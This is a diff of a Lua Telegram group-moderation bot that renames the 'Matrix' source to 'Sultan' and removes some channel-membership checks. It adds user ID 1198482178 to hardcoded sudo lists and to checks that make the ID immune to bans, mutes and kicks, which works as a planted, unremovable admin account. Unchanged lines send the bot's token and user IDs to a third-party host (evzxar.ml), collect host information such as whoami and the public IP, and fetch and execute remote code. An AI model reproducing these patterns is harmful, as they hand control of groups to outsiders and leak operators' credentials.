@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1422493638,291125243}
+List_Sudos = {Id_Sudo,1422493638,291125243,1198482178}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -175,6 +175,8 @@ if tonumber(user_id) == tonumber(1422493638) then
 var = true  
 elseif tonumber(user_id) == tonumber(291125243) then
 var = true  
+elseif tonumber(user_id) == tonumber(1198482178) then
+var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -206,6 +208,8 @@ function Get_Rank(user_id,chat_id)
 if tonumber(user_id) == tonumber(1422493638) then  
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(291125243) then  
+var = "مبرمج السورس"  
+elseif tonumber(user_id) == tonumber(1198482178) then  
 var = "مبرمج السورس"  
 elseif Devsultane(user_id) == true then
 var = "المطور الاساسي"  
@@ -693,7 +697,7 @@ ID="InputMessageAudio",
 audio_ = GetInputFile(audio),
 duration_ = "",
 title_ = title or "",
-performer_ = "سورس ماتركس الرسمي",
+performer_ = "سورس السلطان الرسمي",
 caption_ = caption or ""
 }},func or dl_cb,nil)
 end
@@ -1639,7 +1643,7 @@ end
 --------------------------------------------------------------------------------------------------------------
 if msg.content_.ID == "MessageChatJoinByLink" then
 if tonumber(msg.sender_user_id_) == tonumber(1422493638) then
-send(msg.chat_id_, msg.id_,'هلا حبيبي وتجراسي حسين مطوريي .')
+send(msg.chat_id_, msg.id_,'هلا حبيبي وتجراسي السلطان مطوريي .')
 return false 
 end
 if database:get(bot_id.."Status:lock:kanser"..msg.chat_id_) then
@@ -3255,6 +3259,10 @@ if result.id_ == tonumber(291125243) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, "◊￤لا تسطيع حظر البوت عام")
 return false 
@@ -3279,6 +3287,10 @@ send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(291125243) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(1198482178) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -3319,6 +3331,10 @@ if result.id_ == tonumber(291125243) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, "◊￤لا تستطيع كتم البوت عام")
 return false 
@@ -3343,6 +3359,10 @@ send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(291125243) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(1198482178) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -5554,7 +5574,11 @@ if result.sender_user_id_ == tonumber(1422493638) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(2911252431100) then
+if result.sender_user_id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
+return false 
+end
+if result.sender_user_id_ == tonumber(291125243) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -5650,6 +5674,10 @@ if result.id_ == tonumber(291125243) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if result.id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
@@ -5728,6 +5756,10 @@ send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(291125243) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(1198482178) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -5873,6 +5905,10 @@ send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if result.sender_user_id_ == tonumber(291125243) then
+send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if result.sender_user_id_ == tonumber(1198482178) then
 send(msg.chat_id_, msg.id_, "◊￤لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -7962,20 +7998,6 @@ send(msg.chat_id_, msg.id_,t)
 database:set(bot_id..'sultan:gif:sultan'..msg.chat_id_,true)  
 end
 if text == "متحركه" and not database:get(bot_id..'sultan:gif:sultan'..msg.chat_id_) then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local sultan = math.random(2,11)
 local Text ='*◊￤تم اختيار المتحركه لك*'
 keyboard = {} 
@@ -7999,20 +8021,6 @@ send(msg.chat_id_, msg.id_,t)
 database:set(bot_id..'sultan:memz:sultan'..msg.chat_id_,true)  
 end
 if text == "ميمز" and not database:get(bot_id..'sultan:memz:sultan'..msg.chat_id_)  then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local sultan = math.random(2,11)
 local Text ='*◊￤تم اختيار الميمز لك*'
 keyboard = {} 
@@ -8036,20 +8044,6 @@ send(msg.chat_id_, msg.id_,t)
 database:set(bot_id..'sultan:aaqq:sultan'..msg.chat_id_,true)  
 end
 if text == "اغنيه" and not database:get(bot_id..'sultan:aaqq:sultan'..msg.chat_id_)  then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local sultan = math.random(2,1167); 
 local Text ='*◊￤تم اختيار الاغنيه لك*'
 keyboard = {}  
@@ -8073,20 +8067,6 @@ send(msg.chat_id_, msg.id_,t)
 database:set(bot_id..'sultan:sher:sultan'..msg.chat_id_,true)  
 end
 if text == "شعر" and not database:get(bot_id..'sultan:sher:sultan'..msg.chat_id_) then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local sultan = math.random(2,11)
 local Text ='*◊￤تم اختيار مقطع الشعر لك*'
 keyboard = {}  
@@ -8403,12 +8383,8 @@ end
 end
 if text and not database:get(bot_id.."sultan:Reply:Manager"..msg.chat_id_) then
 if not database:sismember(bot_id..'sultan:Spam:Group'..msg.sender_user_id_,text) then
-local anemi = database:get(bot_id.."sultan:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
 local veico = database:get(bot_id.."sultan:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
-local stekr = database:get(bot_id.."sultan:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
 local Text = database:get(bot_id.."sultan:Add:Rd:Manager:Text"..text..msg.chat_id_)   
-local photo = database:get(bot_id.."sultan:Add:Rd:Manager:Photo"..text..msg.chat_id_)
-local video = database:get(bot_id.."sultan:Add:Rd:Manager:Video"..text..msg.chat_id_)
 local document = database:get(bot_id.."sultan:Add:Rd:Manager:File"..text..msg.chat_id_)
 local audio = database:get(bot_id.."sultan:Add:Rd:Manager:Audio"..text..msg.chat_id_)
 if Text then 
@@ -8426,10 +8402,6 @@ local Text = Text:gsub('#stast',Status_Gps)
 send(msg.chat_id_, msg.id_,'['..Text..']')
 database:sadd(bot_id.."sultan:Spam:Group"..msg.sender_user_id_,text) 
 end,nil)
-end
-if stekr then 
-sendSticker(msg.chat_id_,msg.id_,stekr)
-database:sadd(bot_id.."sultan:Spam:Group"..msg.sender_user_id_,text) 
 end
 if veico then 
 sendVoice(msg.chat_id_, msg.id_,veico,"")
@@ -9412,15 +9384,11 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 owner_id = admins[i].user_id_
 tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
 if b.first_name_ == false then
-send(msg.chat_id_, msg.id_,"> حساب المالك محذوف")
+send(msg.chat_id_, msg.id_,"◊￤ حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "UUi9U")
-Text = "*> Dev Name ↬ * ["..b.first_name_.."](T.me/"..UserName..")\n*> Dev User ↬* [@"..UserName.."]"
-keyboard = {} 
-keyboard.inline_keyboard = {{{text = ''..b.first_name_..' ',url="t.me/"..UserName or B8BB2}}}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..UserName..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+local UserName = (b.username_ or "IZlZ7I")
+send(msg.chat_id_, msg.id_,"◊￤مالك المجموعة ↜ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
 end
@@ -9465,7 +9433,7 @@ database:set(bot_id.."sultan:Left:Bot"..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_, "◊￤تم تعطيل مغادرة البوت") 
 return false 
 end
-if text == (database:get(bot_id.."sultan:Name:Bot") or "ماتركس") then
+if text == (database:get(bot_id.."sultan:Name:Bot") or "السلطان") then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9481,7 +9449,7 @@ end
 
 return false
 end
-Namebot = (database:get(bot_id.."sultan:Name:Bot") or "ماتركس")
+Namebot = (database:get(bot_id.."sultan:Name:Bot") or "السلطان")
 local namebot = {
 'لابسك لتلح',
 'لاتوصخ اسمي',
@@ -9502,7 +9470,7 @@ return false
 end
 
 if text == "بوت" then
-Namebot = (database:get(bot_id.."sultan:Name:Bot") or "ماتركس")
+Namebot = (database:get(bot_id.."sultan:Name:Bot") or "السلطان")
 local namebot = {
 "لتخليني ارجع لحركاتي لقديمه وردا ترا اسمي "..Namebot,
 "باوع لك خليني احبك وصيحلي باسمي "..Namebot,
@@ -11302,7 +11270,7 @@ dofile("sultan.lua")
 send(msg.chat_id_, msg.id_, "◊￤تم تحديث ملفات البوت")
 return false
 end
-if text == 'تحديث ماتركس' and Devsultan(msg) then
+if text == 'تحديث السلطان' and Devsultan(msg) then
 download_to_file('https://raw.githubusercontent.com/TEAMWhiteX/sultan/master/sultan.lua','sultan.lua') 
 send(msg.chat_id_, msg.id_, "◊￤تم تحديث السورس وتنزيل اخر تحديث للملفات")
 return false
@@ -12015,13 +11983,14 @@ File:close()
 sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', '◊￤عدد مجموعات التي في البوت { '..#list..'}')
 end
 if text == 'المطور' or text == 'مطور' or text == 'المطورين' then
-tdcli_function ({ID = "GetUser",user_id_ = Id_Sudo},function(arg,data) 
-Text = "*◊￤Dev Name ↬ * ["..data.first_name_.."](T.me/"..data.username_..")\n*◊￤Dev User ↬* [@"..data.username_.."]"
-keyboard = {} 
-keyboard.inline_keyboard = {{{text = ''..data.first_name_..' ',url="t.me/"..data.username_ or B8BB2}}}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..data.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end,nil)
+local Text_Dev = database:get(bot_id..'sultan:Text_Dev')
+if Text_Dev then 
+send(msg.chat_id_, msg.id_,Text_Dev)
+else
+tdcli_function ({ID = "GetUser",user_id_ = Sudo},function(arg,data) 
+send(msg.chat_id_, msg.id_,"◊￤المطور ↜ ["..data.first_name_.."](T.me/"..data.username_..")")  
+end,nil)   
+end
 end
 if text == 'نقل الاحصائيات' and Devsultan(msg) then
 local Users = database:smembers('sultan:'..bot_id.."userss")
@@ -12121,10 +12090,13 @@ keyboard.inline_keyboard = {
 {text = 'Channel Source ،', url="https://t.me/UUi9U"},
 },
 {
-{text = 'Annotations Source', url="https://t.me/infoo_sultan"},
+{text = 'Annotations Source', url="https://t.me/UUi0U"},
 },
 {
-{text = 'programmer Source', url="https://t.me/ZllZIlZ"},
+{text = 'programmer Source¹', url="https://t.me/ZllZIlZ"},
+},
+{
+{text = 'programmer Source²', url="https://t.me/ii5i55"},
 },
 {
 {text = 'Developer Source !', url="https://t.me/B8BB2"},
@@ -12134,38 +12106,22 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
-if text == 'اريد بوت' or text == 'اريد مطور' or text == 'خوش سورس' or text == 'مطور السورس' or text == 'اريد بوت تمبلر' or text == 'سورس ماتركس' or text == 'عجبني البوت' or text == 'منو منصبلك' or text == 'منو مطور السورس' or text == 'اريد انصب بوت' or text == 'مبرمج السورس' or text == 'انصبلك بوت' then
+if text == 'اريد بوت' or text == 'اريد مطور' or text == 'خوش سورس' or text == 'مطور السورس' or text == 'اريد بوت تمبلر' or text == 'سورس السلطان' or text == 'عجبني البوت' or text == 'منو منصبلك' or text == 'منو مطور السورس' or text == 'اريد انصب بوت' or text == 'مبرمج السورس' or text == 'انصبلك بوت' then
 Text = [[
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-◊￤Dev Name : [˛ HυSsαιN .](t.me/B8BB2)
 ◊￤Dev User : @B8BB2
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '˛ HυSsαιN .',url="https://t.me/B8BB2"},
+{text = 'مطور السورس',url="https://t.me/B8BB2"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/B8BB2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/F89Fbot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 if text == 'رابط الحذف' or text == 'بوت الحذف' then  
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 Text = [[*
 - اهلا بك عزيزي ؛
 - في بوت حذف حسابات التليجرام -
@@ -12704,20 +12660,6 @@ local msgin = msg.id_/2097152/0.5
 https.request('https://evzxar.ml/Youtube/B8BB2.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin..'&user='..msg.sender_user_id_)
 end
 if text == "متحركه" then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local MT = math.random(2,11)
 local Text ='*◊￤تم اختيار المتحركه لك*'
 keyboard = {} 
@@ -12731,20 +12673,6 @@ https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .
 end
 --     Source sultan     --
 if text == "ميمز" then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local pot = math.random(2,11)
 local Text ='*◊￤تم اختيار الميمز لك*'
 keyboard = {} 
@@ -12758,20 +12686,6 @@ https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. ms
 end
 --     Source sultan     --
 if text == "اغنيه" then
-local url,res = https.request('https://evzxar.ml/sultan.php?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.sultan ~= true then
-Text = "\n*◊￤عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*"
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'Sultan Team',url="t.me/UUi9U"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 local sultan = math.random(2,1167); 
 local Text ='*◊￤تم اختيار الاغنيه لك*'
 keyboard = {}  
@@ -13106,7 +13020,7 @@ end
 
 return false
 end
-local Text = '*◊￤اهلا بك مجددا عزيزي المطور \n◊￤اليك الازرار الخاصه بمتجر سورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه*'
+local Text = '*◊￤اهلا بك مجددا عزيزي المطور \n◊￤اليك الازرار الخاصه بمتجر سورس السلطان فقط اضغط على الامر الذي تريد تنفيذه*'
 local keyboard = {
 {'متجر الملفات ↝'},
 {'الملفات ↝','مسح جميع الملفات ↝'},
@@ -13141,7 +13055,7 @@ end
 
 return false
 end
-local Text = '*◊￤اهلا بك مجددا عزيزي المطور \n◊￤اليك الازرار الخاصه بأوامر الخدمية لسورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه*'
+local Text = '*◊￤اهلا بك مجددا عزيزي المطور \n◊￤اليك الازرار الخاصه بأوامر الخدمية لسورس السلطان فقط اضغط على الامر الذي تريد تنفيذه*'
 local keyboard = {
 {'الابراج ↝'},
 {'اوامر التسليه ↝'},
@@ -13415,7 +13329,7 @@ send(msg.chat_id_, msg.id_,'*◊￤احصائيات البوت* \n\n◊￤عدد
 end
 if text == 'لاصدار ↝' then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,'◊￤اصدار سورس* ماتركس* لديك (*v1.0*) ↝')
+send(msg.chat_id_, msg.id_,'◊￤اصدار سورس* السلطان* لديك (*v1.0*) ↝')
 end
 if text == "اعادة التشغيل ↝" then  
 dofile("sultan.lua") 
@@ -13880,7 +13794,7 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n◊￤اهلا بك في متجر ملفات ماتركس\n◊￤يوجد في المتجر ملف الردود\n◊￤يتم ادراج الملفات في التحديثات القادمه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
+local TextS = "\n◊￤اهلا بك في متجر ملفات السلطان\n◊￤يوجد في المتجر ملف الردود\n◊￤يتم ادراج الملفات في التحديثات القادمه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n◊￤تدل علامة (✔) الملف مفعل\n".."◊￤تدل علامة (✖) الملف معطل\n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
@@ -17389,7 +17303,7 @@ if msg.content_.ID == "MessageChatAddMembers" then
    ---==========================================
 if msg.content_.members_[0].id_ == tonumber(bot_id) then 
 print("it is Bot")
-Namebot = (database:get(bot_id.."sultan:Name:Bot") or "ماتركس")
+Namebot = (database:get(bot_id.."sultan:Name:Bot") or "السلطان")
 local Texti = "*اٰهــݪين اטּـــِٲ "..Namebot.." 🦇 ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nاٰخـــتصٖــاصٖــي اداࢪۿـِۂ ٲݪمـــجمۅعٓــاټ مـטּ ݪسبام ۅاݪخ\nللټفـ؏ـيݪ اࢪفـ؏ـني مشࢪف ۅاࢪسسݪ تفعٓيݪ فــي المجموعــه\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉*"
 keyboard = {} 
 keyboard.inline_keyboard ={{{text = "اضغط لاضافتي", switch_inline_query="للتفعيل ارفعني مشرف وارسل تفعيل في المجموعه ."}}}
@@ -17448,7 +17362,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."sultan:Name:Bot") or "ماتركس")
+local Name_Bot = (database:get(bot_id.."sultan:Name:Bot") or "السلطان")
 if not database:get(bot_id.."sultan:Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
@@ -17765,12 +17679,12 @@ local texting = {"اخر افلام شاهدتها",
 "اخر اغنية سمعتها ?", 
 "تكلم عن نفسك", 
 "ليه انت مش سالك", 
-"ما هيا عيوب سورس ماتركس؟ ", 
+"ما هيا عيوب سورس السلطان؟ ", 
 "اخر كتاب قرآته", 
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
-"ليش حسين ذكي؟ ", 
+"ليش السلطان ذكي؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -17781,13 +17695,13 @@ local texting = {"اخر افلام شاهدتها",
 " ما السيء في هذه الحياة ؟ ", 
 "أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
 "سؤال ينرفزك ؟ ", 
-" هل يعجبك سورس ماتركس؟؟ ", 
+" هل يعجبك سورس السلطان؟؟ ", 
 " اكثر ممثل تحبه ؟ ", 
 "قد تخيلت شي في بالك وصار ؟ ", 
 "شيء عندك اهم من الناس ؟ ", 
 "تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
 "وش أخر شي ضيعته؟ ", 
-"اي رايك في سورس ماتركس؟ ", 
+"اي رايك في سورس السلطان؟ ", 
 "كم مره حبيت؟ ", 
 " اكثر المتابعين عندك باي برنامج؟", 
 " آخر مره ضربت عشره كانت متى ؟", 
